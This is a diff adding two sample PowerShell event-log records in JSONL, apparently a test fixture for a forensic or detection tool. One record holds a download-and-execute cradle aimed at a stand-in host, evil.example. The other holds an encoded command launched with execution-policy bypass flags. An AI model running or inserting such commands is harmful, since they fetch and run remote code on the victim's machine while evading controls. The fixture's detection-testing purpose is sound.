@@ -1,0 +1,2 @@
+{"ArtifactType":"powershell_event","EventID":4104,"TimeCreated":"2026-05-14T08:31:00+00:00","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')","SourceFile":"powershell_events_sample.jsonl","Machine":"DESKTOP-K6F8D3D","User":"alex"}
+{"ArtifactType":"powershell_event","EventID":400,"TimeCreated":"2026-05-14T08:30:00+00:00","HostApplication":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA","SourceFile":"powershell_events_sample.jsonl","Machine":"DESKTOP-K6F8D3D","User":"alex"}
